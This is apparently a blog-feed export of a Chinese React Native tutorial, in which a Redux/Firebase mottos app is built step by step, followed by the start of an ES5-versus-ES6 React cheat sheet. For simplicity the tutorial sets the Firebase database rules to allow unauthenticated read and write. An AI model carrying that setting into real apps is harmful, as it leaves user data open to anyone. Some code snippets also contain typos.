
// 安裝 React Native command line 工具$ npm install -g react-native-cli

由於我們是要開發 Android 平台，所以必須安裝：

安裝 JDK
安裝 Android SDK
設定一些環境變數

以上可以透過 Install Android Studio 官網和 官方安裝說明 步驟完成。
現在，我們先透過一個簡單的 HelloWorldApp，讓大家感受一下 React Native 專案如何開發。
首先，我們先初始化一個 React Native Project：
$ react-native init HelloWorldApp

初始的資料夾結構長相：

接下來請先安裝註冊 Genymotion，Genymotion 是一個透過電腦模擬 Android 系統的好用開發模擬器環境。安裝完後可以打開並選擇欲使用的螢幕大小和 API 版本的 Android 系統。建立裝置後就可以啟動我們的裝置：

若你是使用 Mac OS 作業系統的話可以執行 run-ios，若是使用 Android 平台則使用 run-android 啟動你的 App。在這邊我們先使用 Android 平台進行開發（若你希望實機測試，請將電腦接上你的 Android 手機，記得確保 menu 中的 ip 位置要和電腦網路 相同。若是遇到連不到程式 server 且手機為 Android 5.0+ 系統，可以執行 adb reverse tcp:8081 tcp:8081，詳細情形可以參考官網說明）：
$ react-native run-android

如果一切順利的話就可以在模擬器中看到初始畫面：

接著打開 index.android.js 就可以看到以下程式碼：
import React, &#123; Component &#125; from &#x27;react&#x27;;import &#123;  AppRegistry,  StyleSheet,  Text,  View&#125; from &#x27;react-native&#x27;;// 元件式的開發方式和 React 如出一轍，但要注意的是在 React Native 中我們不使用 HTML 元素而是使用 React Native 元件進行開發，這也符合 Learn once, write anywhere 的原則。class HelloWorldApp extends Component &#123;  render() &#123;    return (      &lt;View style=&#123;styles.container&#125;&gt;        &lt;Text style=&#123;styles.welcome&#125;&gt;          Welcome to React Native!        &lt;/Text&gt;        &lt;Text style=&#123;styles.instructions&#125;&gt;          To get started, edit index.android.js        &lt;/Text&gt;        &lt;Text style=&#123;styles.instructions&#125;&gt;          Double tap R on your keyboard to reload,&#123;&#x27;\n&#x27;&#125;          Shake or press menu button for dev menu        &lt;/Text&gt;      &lt;/View&gt;    );  &#125;&#125;// 在 React Native 中 styles 是使用 JavaScript 形式來撰寫，與一般 CSS 比較不同的是他使用駝峰式的屬性命名：const styles = StyleSheet.create(&#123;  container: &#123;    flex: 1,    justifyContent: &#x27;center&#x27;,    alignItems: &#x27;center&#x27;,    backgroundColor: &#x27;#F5FCFF&#x27;,  &#125;,  welcome: &#123;    fontSize: 20,    textAlign: &#x27;center&#x27;,    margin: 10,  &#125;,  instructions: &#123;    textAlign: &#x27;center&#x27;,    color: &#x27;#333333&#x27;,    marginBottom: 5,  &#125;,&#125;);// 告訴 React Native App 你的進入點：AppRegistry.registerComponent(&#x27;HelloWorldApp&#x27;, () =&gt; HelloWorldApp);

由於 React Native 有支援 Hot Reloading，若我們更改了檔案內容，我們可以使用打開模擬器 Menu 重新刷新頁面，此時就可以在看到原本的 Welcome to React Native! 文字已經改成 Welcome to React Native Rock!!!! 


嗯，有沒有感覺在開發網頁的感覺？
動手實作相信看到這裡讀者們一定等不及想大展身手，使用 React Native 開發你第一個 App。俗話說學習一項新技術最好的方式就是做一個 TodoApp。所以，接下來的文章，筆者將帶大家使用 React Native 結合 Redux&#x2F;ImmutableJS 和 Firebase 開發一個記錄和刪除名言佳句（Mottos）的 Mobile App！
專案成果截圖

環境安裝與設定相關套件安裝：
$ npm install --save redux react-redux immutable redux-immutable redux-actions uuid firebase

$ npm install --save-dev babel-core babel-eslint babel-loader babel-preset-es2015 babel-preset-react babel-preset-react-native eslint-plugin-react-native  eslint eslint-config-airbnb eslint-loader eslint-plugin-import eslint-plugin-jsx-a11y eslint-plugin-react redux-logger

安裝完相關工具後我們可以初始化我們專案：
// 注意專案不能使用 - 或 _ 命名$ react-native init ReactNativeFirebaseMotto$ cd ReactNativeFirebaseMotto

我們先準備一下我們資料夾架構，將它設計成：

Firebase 簡介與設定在這個專案中我們會使用到 Firebase 這個 Back-End as Service的服務，也就是說我們不用自己建立後端程式資料庫，只要使用 Firebase 所提供的 API 就好像有了一個 NoSQL 資料庫一樣，當然 Firebase 不單只有提供資料儲存的功能，但限於篇幅我們這邊將只介紹資料儲存的功能。 

首先我們進到 Firebase 首頁  

登入後點選建立專案，依照自己想取的專案名稱命名


  

選擇將 Firebase 加入你的網路應用程式的按鈕可以取得 App ID 的 config 資料，待會我們將會使用到

  

點選左邊選單中的 Database 並點選 Realtime Database Tab 中的規則

  
  設定改為，在範例中為求簡單，我們先不用驗證方式即可操作：
  &#123;  &quot;rules&quot;: &#123;    &quot;.read&quot;: true,    &quot;.write&quot;: true  &#125;&#125;

Firebase 在使用上有許多優點，其中一個使用 Back-End As Service 的好處是你可以專注在應用程式的開發便免花過多時間處理後端基礎建設的部份，更可以讓 Back-End 共用在不同的 client side 中。此外 Firebase 在和 React 整合上也十分容易，你可以想成 Firebase 負責資料的儲存，透過 API 和 React 元件互動，Redux 負責接收管理 client state，若是監聽到 Firebase 後端資料更新後同步更新 state 並重新 render 頁面。
使用 Flexbox 進行 UI 布局設計在 React Native 中是使用 Flexbox 進行排版，若讀者對於 Flexbox 尚不熟悉，建議可以參考這篇文章，若有需要遊戲化的學習工具，也非常推薦這兩個教學小遊戲：FlexDefense、FLEXBOX FROGGY。
事實上我們可以將 Flexbox 視為一個箱子，最外層是 flex containers、內層包的是 flex items，在屬性上也有分是針對flex containers 還是針對是 flex items 設計的。在方向性上由左而右是 main axis，而上到下是 cross axis。

在 Flexbox 有許多屬性值，其中最重要的當數 justifyContent 和 alignItems 以及 flexDirection（注意 React Native Style 都是駝峰式寫法），所以我們這邊主要介紹這三個屬性：
Flex Direction 負責決定整個 flex containers 的方向，預設為 row 也可以改為 column 、 row-reverse 和 column-reverse。

Justify Content 負責決定整個 flex containers 內的 items 的水平擺設，主要屬性值有：flex-start、flex-end、center、space-between、space-around。

Align Items 負責決定整個 flex containers 內的 items 的垂直擺設，主要屬性值有：flex-start、flex-end、center、stretch、baseline。

動手實作有了前面的準備，現在我們終於要開始進入核心的應用程式開發了！
首先我們先設定好整個 App 的進入檔 index.android.js，在這個檔案中我們設定了初始化的設定和主要元件 &lt;Main /&gt;：
/** * Sample React Native App * https://github.com/facebook/react-native * @flow */import React, &#123; Component &#125; from &#x27;react&#x27;;import &#123;  AppRegistry,  Text,  View&#125; from &#x27;react-native&#x27;;import Main from &#x27;./src/components/Main&#x27;;class ReactNativeFirebaseMotto extends Component &#123;  render() &#123;    return (      &lt;Main /&gt;    );  &#125;&#125;AppRegistry.registerComponent(&#x27;ReactNativeFirebaseMotto&#x27;, () =&gt; ReactNativeFirebaseMotto);

在 src/components/Main/Main.js 中我們設定好整個 Component 的布局和並將 Firebase 引入並初始化，將操作 Firebase 資料庫的參考往下傳，根節點我們命名為 items，所以之後所有新增的 motto 都會在這個根節點之下並擁有特定的 key 值。在 Main 我們同樣規劃了整個布局，包括：&lt;ToolBar /&gt;、&lt;MottoListContainer /&gt;、&lt;ActionButtonContainer /&gt;、&lt;InputModalContainer /&gt;。
import React from &#x27;react&#x27;;import ReactNative from &#x27;react-native&#x27;;import &#123; Provider &#125; from &#x27;react-redux&#x27;; import ToolBar from &#x27;../ToolBar&#x27;;import MottoListContainer from &#x27;../../containers/MottoListContainer&#x27;;import ActionButtonContainer from &#x27;../../containers/ActionButtonContainer&#x27;;import InputModalContainer from &#x27;../../containers/InputModalContainer&#x27;;import ListItem from &#x27;../ListItem&#x27;;import * as firebase from &#x27;firebase&#x27;;// 將 Firebase 的 config 值引入import &#123; firebaseConfig &#125; from &#x27;../../constants/config&#x27;;// 引用 Redux storeimport store from &#x27;../../store&#x27;;const &#123; View, Text &#125; = ReactNative;// Initialize Firebaseconst firebaseApp = firebase.initializeApp(firebaseConfig);// Create a reference with .ref() instead of new Firebase(url)const rootRef = firebaseApp.database().ref();const itemsRef = rootRef.child(&#x27;items&#x27;);// 將 Redux 的 store 透過 Provider 往下傳const Main = () =&gt; (  &lt;Provider store=&#123;store&#125;&gt;    &lt;View&gt;      &lt;ToolBar style=&#123;styles.toolBar&#125; /&gt;      &lt;MottoListContainer itemsRef=&#123;itemsRef&#125; /&gt;      &lt;ActionButtonContainer /&gt;      &lt;InputModalContainer itemsRef=&#123;itemsRef&#125; /&gt;    &lt;/View&gt;  &lt;/Provider&gt;);export default Main; 

設定完了基本的布局方式後我們來設定 Actions 和其使用的常數，src/actions/mottoActions.js：
export const GET_MOTTOS = &#x27;GET_MOTTOS&#x27;;export const CREATE_MOTTO = &#x27;CREATE_MOTTO&#x27;;export const SET_IN_MOTTO = &#x27;SET_IN_MOTTO&#x27;;export const TOGGLE_MODAL = &#x27;TOGGLE_MODAL&#x27;;

我們在 constants 資料夾中也設定了我們整個 data 的資料結構，以下是 src/constants/models.js：
import Immutable from &#x27;immutable&#x27;;export const MottoState = Immutable.fromJS(&#123;  mottos: [],  motto: &#123;    id : &#x27;&#x27;,    text: &#x27;&#x27;,    updatedAt: &#x27;&#x27;,  &#125;&#125;);export const UiState = Immutable.fromJS(&#123;  isModalVisible: false,&#125;);

還記得我們提到的 Firebase config 嗎？這邊我們把相關的設定檔放在src/configs/config.js中： 
export const firebaseConfig = &#123;  apiKey: &quot;apiKey&quot;,  authDomain: &quot;authDomain&quot;,  databaseURL: &quot;databaseURL&quot;,  storageBucket: &quot;storageBucket&quot;,&#125;;

在我們應用程式中同樣使用了 redux 和 redux-actions。在這個範例中我們設計了：GET_MOTTOS、CREATE_MOTTO、SET_IN_MOTTO 三個操作 motto 的 action，分別代表從 Firebase 取出資料、新增資料和 set 資料。以下是 src/actions/mottoActions.js：
import &#123; createAction &#125; from &#x27;redux-actions&#x27;;import &#123;  GET_MOTTOS,  CREATE_MOTTO,  SET_IN_MOTTO,&#125; from &#x27;../constants/actionTypes&#x27;;export const getMottos = createAction(&#x27;GET_MOTTOS&#x27;);export const createMotto = createAction(&#x27;CREATE_MOTTO&#x27;);export const setInMotto = createAction(&#x27;SET_IN_MOTTO&#x27;);

同樣地，由於我們設計了當使用者想新增 motto 時會跳出 modal，所以我們可以設定一個 TOGGLE_MODAL 負責開關 modal 的 state。以下是 src/actions/uiActions.js：
import &#123; createAction &#125; from &#x27;redux-actions&#x27;;import &#123;  TOGGLE_MODAL,&#125; from &#x27;../constants/actionTypes&#x27;;export const toggleModal = createAction(&#x27;TOGGLE_MODAL&#x27;);

以下是 src/actions/index.js，用來匯出我們的 actions：
export * from &#x27;./uiActions&#x27;;export * from &#x27;./mottoActions&#x27;;

設定完我們的 actions 後我們來設定 reducers，在這邊我們同樣使用 redux-actions 整合 ImmutableJS，
import &#123; handleActions &#125; from &#x27;redux-actions&#x27;;// 引入 initialState import &#123;   MottoState&#125; from &#x27;../../constants/models&#x27;;import &#123;  GET_MOTTOS,  CREATE_MOTTO,  SET_IN_MOTTO,&#125; from &#x27;../../constants/actionTypes&#x27;;// 透過 set 和 seIn 可以產生 newStateconst mottoReducers = handleActions(&#123;  GET_MOTTOS: (state, &#123; payload &#125;) =&gt; (    state.set(      &#x27;mottos&#x27;,      payload.mottos    )  ),    CREATE_MOTTO: (state) =&gt; (    state.set(      &#x27;mottos&#x27;,      state.get(&#x27;mottos&#x27;).push(state.get(&#x27;motto&#x27;))    )  ),  SET_IN_MOTTO: (state, &#123; payload &#125;) =&gt; (    state.setIn(      payload.path,      payload.value    )  )&#125;, MottoState);export default mottoReducers;

以下是 src/reducers/uiState.js：
import &#123; handleActions &#125; from &#x27;redux-actions&#x27;;import &#123;   UiState,&#125; from &#x27;../../constants/models&#x27;;import &#123;  TOGGLE_MODAL,&#125; from &#x27;../../constants/actionTypes&#x27;;// modal 的顯示與否const uiReducers = handleActions(&#123;  TOGGLE_MODAL: (state) =&gt; (    state.set(      &#x27;isModalVisible&#x27;,      !state.get(&#x27;isModalVisible&#x27;)    )  ),  &#125;, UiState);export default uiReducers;

以下是 src/reducers/index.js，將所有 reducers combine 在一起：
import &#123; combineReducers &#125; from &#x27;redux-immutable&#x27;;import ui from &#x27;./ui/uiReducers&#x27;;import motto from &#x27;./data/mottoReducers&#x27;;const rootReducer = combineReducers(&#123;  ui,  motto,&#125;);export default rootReducer;

透過 src/store/configureStore.js將 reducers 和 initialState 以及要使用的 middleware 整合成 store：
import &#123; createStore, applyMiddleware &#125; from &#x27;redux&#x27;;import createLogger from &#x27;redux-logger&#x27;;import Immutable from &#x27;immutable&#x27;;import rootReducer from &#x27;../reducers&#x27;;const initialState = Immutable.Map();export default createStore(  rootReducer,  initialState,  applyMiddleware(createLogger(&#123; stateTransformer: state =&gt; state.toJS() &#125;)));

設定完資料層的架構後，我們又重新回到 View 的部份，我們開始依序設定我們的 Component 和 Container。首先，我們先設計我們的標題列 ToolBar，以下是 src/components/ToolBar/ToolBar.js：
import React from &#x27;react&#x27;;import ReactNative from &#x27;react-native&#x27;;import styles from &#x27;./toolBarStyles&#x27;;const &#123; View, Text &#125; = ReactNative;const ToolBar = () =&gt; (  &lt;View style=&#123;styles.toolBarContainer&#125;&gt;    &lt;Text style=&#123;styles.toolBarText&#125;&gt;Startup Mottos&lt;/Text&gt;  &lt;/View&gt;);export default ToolBar; 

以下是 src/components/ToolBar/toolBarStyles.js，將底色設定為黃色，文字置中：
import &#123; StyleSheet &#125; from &#x27;react-native&#x27;;export default StyleSheet.create(&#123;  toolBarContainer: &#123;    height: 40,    justifyContent: &#x27;center&#x27;,    alignItems: &#x27;center&#x27;,    flexDirection: &#x27;column&#x27;,    backgroundColor: &#x27;#ffeb3b&#x27;,  &#125;,  toolBarText: &#123;    fontSize: 20,    color: &#x27;#212121&#x27;  &#125;&#125;);

以下是 src/components/MottoList/MottoList.js，這個 Component 中稍微複雜一些，主要是使用到了 React Native 中的 ListView Component 將資料陣列傳進 dataSource，透過 renderRow 把一個個 row 給 render 出來，過程中我們透過 !Immutable.is(r1.get(&#39;id&#39;), r2.get(&#39;id&#39;)) 去判斷整個 ListView 畫面是否需要 loading 新的 item 進來，這樣就可以提高整個 ListView 的效能。
import React, &#123; Component &#125; from &#x27;react&#x27;;import ReactNative from &#x27;react-native&#x27;;import Immutable from &#x27;immutable&#x27;;import ListItem from &#x27;../ListItem&#x27;;import styles from &#x27;./mottoStyles&#x27;;const &#123; View, Text, ListView &#125; = ReactNative;class MottoList extends Component &#123;  constructor(props) &#123;    super(props);    this.renderListItem = this.renderListItem.bind(this);    this.listenForItems = this.listenForItems.bind(this);    this.ds = new ListView.DataSource(&#123;      rowHasChanged: (r1, r2) =&gt; !Immutable.is(r1.get(&#x27;id&#x27;), r2.get(&#x27;id&#x27;)),    &#125;)  &#125;  renderListItem(item) &#123;    return (      &lt;ListItem item=&#123;item&#125; onDeleteMotto=&#123;this.props.onDeleteMotto&#125; itemsRef=&#123;this.props.itemsRef&#125; /&gt;    );  &#125;    listenForItems(itemsRef) &#123;    itemsRef.on(&#x27;value&#x27;, (snap) =&gt; &#123;      if(snap.val() === null) &#123;        this.props.onGetMottos(Immutable.fromJS([]));      &#125; else &#123;        this.props.onGetMottos(Immutable.fromJS(snap.val()));        &#125;         &#125;);  &#125;  componentDidMount() &#123;    this.listenForItems(this.props.itemsRef);  &#125;  render() &#123;    return (      &lt;View&gt;        &lt;ListView          style=&#123;styles.listView&#125;          dataSource=&#123;this.ds.cloneWithRows(this.props.mottos.toArray())&#125;          renderRow=&#123;this.renderListItem&#125;          enableEmptySections=&#123;true&#125;        /&gt;      &lt;/View&gt;    );  &#125;&#125;export default MottoList;

以下是 src/components/MottoList/mottoListStyles.js，我們使用到了 Dimensions，可以根據螢幕的高度來設定整個 ListView 高度：
import &#123; StyleSheet, Dimensions &#125; from &#x27;react-native&#x27;;const &#123; height &#125; = Dimensions.get(&#x27;window&#x27;);export default StyleSheet.create(&#123;  listView: &#123;    flex: 1,    flexDirection: &#x27;column&#x27;,    height: height - 105,  &#125;,&#125;);

以下是 src/components/ListItem/ListItem.js，我們從 props 收到了上層傳進來的 motto item，顯示出 motto 文字內容。當我們點擊 &lt;TouchableHighlight&gt; 時就會刪除該 motto。
import React from &#x27;react&#x27;;import ReactNative from &#x27;react-native&#x27;;import styles from &#x27;./listItemStyles&#x27;;const &#123; View, Text, TouchableHighlight &#125; = ReactNative;const ListItem = (props) =&gt; &#123;  return (    &lt;View style=&#123;styles.listItemContainer&#125;&gt;      &lt;Text style=&#123;styles.listItemText&#125;&gt;&#123;props.item.get(&#x27;text&#x27;)&#125;&lt;/Text&gt;      &lt;TouchableHighlight onPress=&#123;props.onDeleteMotto(props.item.get(&#x27;id&#x27;), props.itemsRef)&#125;&gt;        &lt;Text&gt;Delete&lt;/Text&gt;      &lt;/TouchableHighlight&gt;    &lt;/View&gt;  )&#125;;export default ListItem;

以下是 src/components/ListItem/listItemStyles.js：
import &#123; StyleSheet &#125; from &#x27;react-native&#x27;;export default StyleSheet.create(&#123;  listItemContainer: &#123;    flex: 1,    flexDirection: &#x27;row&#x27;,    padding: 10,    margin: 5,  &#125;,  listItemText: &#123;    flex: 10,    fontSize: 18,    color: &#x27;#212121&#x27;,  &#125;&#125;);

以下是 src/components/ActionButton/ActionButton.js，當點擊了按鈕則會觸發 onToggleModal 方法，出現新增 motto 的 modal：
import React from &#x27;react&#x27;;import ReactNative from &#x27;react-native&#x27;;import styles from &#x27;./actionButtonStyles&#x27;;const &#123; View, Text, Modal, TextInput, TouchableHighlight &#125; = ReactNative;  const ActionButton = (props) =&gt; (  &lt;TouchableHighlight onPress=&#123;props.onToggleModal&#125;&gt;    &lt;View style=&#123;styles.buttonContainer&#125;&gt;        &lt;Text style=&#123;styles.buttonText&#125;&gt;Add Motto&lt;/Text&gt;    &lt;/View&gt;  &lt;/TouchableHighlight&gt;);export default ActionButton;

以下是 src/components/ActionButton/actionButtonStyles.js：
import &#123; StyleSheet &#125; from &#x27;react-native&#x27;;export default StyleSheet.create(&#123;  buttonContainer: &#123;    height: 40,    justifyContent: &#x27;center&#x27;,    alignItems: &#x27;center&#x27;,    flexDirection: &#x27;column&#x27;,    backgroundColor: &#x27;#66bb6a&#x27;,  &#125;,  buttonText: &#123;    fontSize: 20,    color: &#x27;#e8f5e9&#x27;  &#125;&#125;);

以下是 src/components/InputModal/InputModal.js，其主要負責 Modal Component 的設計，當輸入內容會觸發 onChangeMottoText 發出 action，注意的是當按下送出鍵，同時會把 Firebase 的參考 itemsRef 送入 onCreateMotto 中，方便透過 API 去即時新增到 Firebase Database，並更新 client state 和重新渲染了 View：
import React from &#x27;react&#x27;;import ReactNative from &#x27;react-native&#x27;;import styles from &#x27;./inputModelStyles&#x27;;const &#123; View, Text, Modal, TextInput, TouchableHighlight &#125; = ReactNative;const InputModal = (props) =&gt; (  &lt;View&gt;    &lt;Modal      animationType=&#123;&quot;slide&quot;&#125;      transparent=&#123;false&#125;      visible=&#123;props.isModalVisible&#125;      onRequestClose=&#123;props.onToggleModal&#125;      &gt;     &lt;View&gt;      &lt;View&gt;        &lt;Text style=&#123;styles.modalHeader&#125;&gt;Please Keyin your Motto!&lt;/Text&gt;        &lt;TextInput          onChangeText=&#123;props.onChangeMottoText&#125;        /&gt;        &lt;View style=&#123;styles.buttonContainer&#125;&gt;                &lt;TouchableHighlight             onPress=&#123;props.onToggleModal&#125;            style=&#123;[styles.cancelButton]&#125;          &gt;            &lt;Text              style=&#123;styles.buttonText&#125;            &gt;              Cancel            &lt;/Text&gt;          &lt;/TouchableHighlight&gt;          &lt;TouchableHighlight             onPress=&#123;props.onCreateMotto(props.itemsRef)&#125;            style=&#123;[styles.submitButton]&#125;          &gt;            &lt;Text              style=&#123;styles.buttonText&#125;            &gt;              Submit            &lt;/Text&gt;          &lt;/TouchableHighlight&gt;          &lt;/View&gt;      &lt;/View&gt;     &lt;/View&gt;    &lt;/Modal&gt;  &lt;/View&gt;);export default InputModal;

以下是 src/components/InputModal/inputModalStyles.js：
import &#123; StyleSheet &#125; from &#x27;react-native&#x27;;export default StyleSheet.create(&#123;  modalHeader: &#123;    flex: 1,    height: 30,    padding: 10,    flexDirection: &#x27;row&#x27;,    backgroundColor: &#x27;#ffc107&#x27;,    fontSize: 20,  &#125;,  buttonContainer: &#123;    flex: 1,    flexDirection: &#x27;row&#x27;,  &#125;,  button: &#123;    borderRadius: 5,  &#125;,  cancelButton: &#123;    flex: 1,    height: 40,    alignItems: &#x27;center&#x27;,    justifyContent: &#x27;center&#x27;,    backgroundColor: &#x27;#eceff1&#x27;,    margin: 5,  &#125;,  submitButton: &#123;    flex: 1,    height: 40,    alignItems: &#x27;center&#x27;,    justifyContent: &#x27;center&#x27;,    backgroundColor: &#x27;#4fc3f7&#x27;,    margin: 5,  &#125;,  buttonText: &#123;    fontSize: 20,  &#125;&#125;);

設定完了 Component，我們來探討一下 Container 的部份。以下是 src/containers/ActionButtonContainer/ActionButtonContainer.js：
import &#123; connect &#125; from &#x27;react-redux&#x27;;import ActionButton from &#x27;../../components/ActionButton&#x27;;import &#123;  toggleModal,&#125; from &#x27;../../actions&#x27;; export default connect(  (state) =&gt; (&#123;&#125;),  (dispatch) =&gt; (&#123;    onToggleModal: () =&gt; (      dispatch(toggleModal())    )  &#125;))(ActionButton);

以下是 src/containers/InputModalContainer/InputModalContainer.js：
import &#123; connect &#125; from &#x27;react-redux&#x27;;import InputModal from &#x27;../../components/InputModal&#x27;;import Immutable from &#x27;immutable&#x27;;import &#123;  toggleModal,  setInMotto,  createMotto,&#125; from &#x27;../../actions&#x27;;import uuid from &#x27;uuid&#x27;; export default connect(  (state) =&gt; (&#123;    isModalVisible: state.getIn([&#x27;ui&#x27;, &#x27;isModalVisible&#x27;]),    motto: state.getIn([&#x27;motto&#x27;, &#x27;motto&#x27;]),  &#125;),  (dispatch) =&gt; (&#123;    onToggleModal: () =&gt; (      dispatch(toggleModal())    ),    onChangeMottoText: (text) =&gt; (      dispatch(setInMotto(&#123; path: [&#x27;motto&#x27;, &#x27;text&#x27;], value: text &#125;))    ),    // 新增 motto 是透過 itemsRef 將新增的 motto push 進去，新增後要把本地端的 motto 清空，並關閉 modal：    onCreateMotto: (motto) =&gt; (itemsRef) =&gt; () =&gt; &#123;      itemsRef.push(&#123; id: uuid.v4(), text: motto.get(&#x27;text&#x27;), updatedAt: Date.now() &#125;);      dispatch(setInMotto(&#123; path: [&#x27;motto&#x27;], value: Immutable.fromJS(&#123; id: &#x27;&#x27;, text: &#x27;&#x27;, updatedAt: &#x27;&#x27; &#125;)&#125;));      dispatch(toggleModal());    &#125;  &#125;),  (stateToProps, dispatchToProps, ownProps) =&gt; &#123;    const &#123; motto &#125; = stateToProps;    const &#123; onCreateMotto &#125; = dispatchToProps;    return Object.assign(&#123;&#125;, stateToProps, dispatchToProps, ownProps, &#123;      onCreateMotto: onCreateMotto(motto),    &#125;);  &#125;,)(InputModal);

以下是 src/containers/MottoListContainer/MottoListContainer.js：
import &#123; connect &#125; from &#x27;react-redux&#x27;;import MottoList from &#x27;../../components/MottoList&#x27;;import Immutable from &#x27;immutable&#x27;;import uuid from &#x27;uuid&#x27;;import &#123;  createMotto,  getMottos,  changeMottoTitle,&#125; from &#x27;../../actions&#x27;;export default connect(  (state) =&gt; (&#123;    mottos: state.getIn([&#x27;motto&#x27;, &#x27;mottos&#x27;]),  &#125;),  (dispatch) =&gt; (&#123;    onCreateMotto: () =&gt; (      dispatch(createMotto())    ),    onGetMottos: (mottos) =&gt; (      dispatch(getMottos(&#123; mottos &#125;))    ),    onChangeMottoTitle: (title) =&gt; (      dispatch(changeMottoTitle(&#123; value: title &#125;))    ),    // 判斷點擊的是哪一個 item 取出其 key，透過 itemsRef 將其移除    onDeleteMotto: (mottos) =&gt; (id, itemsRef) =&gt; () =&gt; &#123;      mottos.forEach((value, key) =&gt; &#123;        if(value.get(&#x27;id&#x27;) === id) &#123;          itemsRef.child(key).remove();        &#125;      &#125;);    &#125;  &#125;),  (stateToProps, dispatchToProps, ownProps) =&gt; &#123;    const &#123; mottos &#125; = stateToProps;    const &#123; onDeleteMotto &#125; = dispatchToProps;    return Object.assign(&#123;&#125;, stateToProps, dispatchToProps, ownProps, &#123;      onDeleteMotto: onDeleteMotto(mottos),    &#125;);  &#125;)(MottoList);

最後我們可以透過啟動模擬器後使用以下指令開啟我們 App！
$ react-native run-android

最後的成果：

同時你可以在 Firebase 後台進行觀察，當呼叫 Firebase API 進行資料更動時，Firebase Realtime Database 就會即時更新：

總結恭喜你！你已經完成了你的第一個 React Native App，若你希望將你開發的應用程式簽章後上架，請參考官方的說明文件，當你完成簽章打包等流程後，我們可以獲得 .apk 檔，這時就可以上架到市集讓隔壁班心儀的女生，啊不是，是廣大的 Android 使用者使用你的 App 啦！當然，由於我們的程式碼可以 100% 共用於 iOS 和 Android 端，所以你也可以同步上架到 Apple Store！完整程式碼請參考這裡。原文連載於 從零開始學 ReactJS。
延伸閱讀
React Native 官方網站
React 官方網站
Redux 官方文件
Ionic Framework vs React Native
How to Build a Todo App Using React, Redux, and Immutable.js
Your First Immutable React &amp; Redux App
React, Redux and Immutable.js: Ingredients for Efficient Web Applications
Full-Stack Redux Tutorial
redux与immutable实例
gajus&#x2F;redux-immutable
acdlite&#x2F;redux-actions
Flux Standard Action
React Native ImmutableJS ListView Example
React Native 0.23.1 warning: ‘In next release empty section headers will be rendered’
js.coach
React Native Package Manager
React Native 学习笔记
The beginners guide to React Native and Firebase
Authentication in React Native with Firebase
bruz&#x2F;react-native-redux-groceries
Building a Simple ToDo App With React Native and Firebase
Firebase Permission Denied
Best Practices: Arrays in Firebase
Avoiding plaintext passwords in gradle
Generating Signed APK

(image via moduscreate、css-tricks、teamtreehouse、teamtreehouse、css-tricks、css-tricks)
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校，目前專注在 Mobile 和 IoT 應用開發。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>React, React Native, ES5, ES6, ES7, JavaScript, iOS, Android, ECMAScript2015, Webpack, JSX, Firebase</tag>
      </tags>
  </entry>
  <entry>
    <title>一看就懂的 React ES5、ES6+ 常見用法對照表</title>
    <url>/2016/04/04/react-react-native-es5-es6-cheat-sheet/</url>
    <content><![CDATA[
前言React 是 Facebook 推出的開源 JavaScript Library。自從 React 正式開源後，React 生態系開始蓬勃發展。事實上，透過學習 React 生態系（ecosystem）的過程中，可以讓我們順便學習現代化 Web 開發的重要觀念（例如：ES6、Webpack、Babel、模組化等），成為更好的開發者。雖然 ES6（ECMAScript2015）、ES7 是未來趨勢（本文將 ES6、ES7 稱為 ES6+），然而目前在網路上有許多的學習資源仍是以 ES5 為主，導致讀者在學習上遇到一些坑洞和迷惑（本文假設讀者對於 React 已經有些基本認識，若你對於 React 尚不熟悉，建議先行閱讀官方文件和本篇入門教學）。因此本文希望透過整理在 React 中 ES5、ES6+ 常見用法對照表，讓讀者們可以在實現功能時（尤其在 React Native）可以更清楚兩者的差異，無痛轉移到 ES6+。 
大綱
Modules
Classes
Method definition
Property initializers
State
Arrow functions
Dynamic property names &amp; template strings
Destructuring &amp; spread attributes
Mixins
Default Parameters

1. Modules隨著 Web 技術的進展，模組化開發已經成為一個重要課題。關於 JavaScript 模組化我們這邊不詳述，建議讀者參考 這份投影片 和 這篇文章。
ES5 若使用 CommonJS 標準，一般使用 require() 用法引入模組：
var React = require(&#x27;react&#x27;);var MyComponent = require(&#x27;./MyComponent&#x27;);

輸出則是使用 module.exports：
module.exports = MyComponent;


ES6+ import 用法：
import React from &#x27;react&#x27;;import MyComponent from &#x27;./MyComponent&#x27;;

輸出則是使用 export default：
export default class MyComponent extends React.Compoent &#123;	&#125;


2. Classes在 React 中元件（Component）是組成視覺頁面的基礎。在 ES5 中我們使用 React.createClass() 來建立 Component，而在 ES6+ 則是用 Classes 繼承 React.Component 來建立 Component。若是有寫過 Java 等物件導向語言（OOP）的讀者應該對於這種寫法比較不陌生，不過要注意的是 JavaScript 仍是原型繼承類型的物件導向程式語言，只是使用 Classes 讓物件導向使用上更加直觀。對於選擇 class 使用上還有疑惑的讀者建議可以閱讀 React.createClass versus extends React.Component 這篇文章。
ES5 React.createClass() 用法：
var Photo = React.createClass(&#123;  render: function() &#123;    return (    	&lt;div&gt;    		&lt;img alt=&#123;this.props.description&#125; src=&#123;this.props.src&#125; /&gt;    	&lt;/div&gt;    	);  &#125;&#125;);ReactDOM.render(&lt;Photo /&gt;, document.getElementById(&#x27;main&#x27;));

ES6+ class 用法：
class Photo extends React.Component &#123;  render() &#123;    return &lt;img alt=&#123;this.props.description&#125; src=&#123;this.props.src&#125; /&gt;;  &#125;&#125;ReactDOM.render(&lt;Photo /&gt;, document.getElementById(&#x27;main&#x27;));

在 ES5 我們會在 componentWillMount  生命週期定義希望在 render 前執行，且只會執行一次的任務：
var Photo = React.createClass(&#123;  componentWillMount: function() &#123;&#125;&#125;);

在 ES6+ 則是定義在 constructor  建構子中：
class Photo extends React.Component &#123;  constructor(props) &#123;    super(props);    // 原本在 componentWillMount 操作的動作可以放在這  &#125;&#125;

3. Method definition在 ES6 中我們使用 Method 可以忽略 function 和 ,，使用上更為簡潔！ES5 React.createClass() 用法：
var Photo = React.createClass(&#123;  handleClick: function(e) &#123;&#125;,  render: function() &#123;&#125;&#125;);

ES6+ class 用法：
class Photo extends React.Component &#123;  handleClick(e) &#123;&#125;  render() &#123;&#125;&#125;


4. Property initializersComponent 屬性值是資料傳遞重要的元素，在 ES5 中我們使用 propTypes  和  getDefaultProps  來定義屬性（props）的預設值和型別：
var Todo = React.createClass(&#123;  getDefaultProps: function() &#123;    return &#123;      checked: false,      maxLength: 10,    &#125;;  &#125;,  propTypes: &#123;    checked: React.PropTypes.bool.isRequired,    maxLength: React.PropTypes.number.isRequired  &#125;,  render: fucntion() &#123;  	return();  &#125;&#125;);

